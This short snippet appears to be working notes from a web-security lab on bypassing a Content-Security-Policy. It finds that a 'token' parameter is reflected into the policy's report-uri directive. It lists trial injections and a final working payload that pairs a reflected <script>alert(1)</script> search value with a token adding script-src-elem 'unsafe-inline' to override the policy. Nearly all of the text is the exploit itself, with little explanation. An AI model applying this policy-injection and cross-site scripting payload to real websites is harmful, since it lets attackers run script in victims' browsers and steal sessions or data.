/*
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; 
                         style-src 'self'; 
                         report-uri /csp-report?token=


//the token is open parameter...
&token=trial   //add this to the URL, we found our input is set the value of report-uri
&token=trial;script-src='unsafe-inline'    //console error

*/
/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
//mind the space
//script-src-elem vs script-src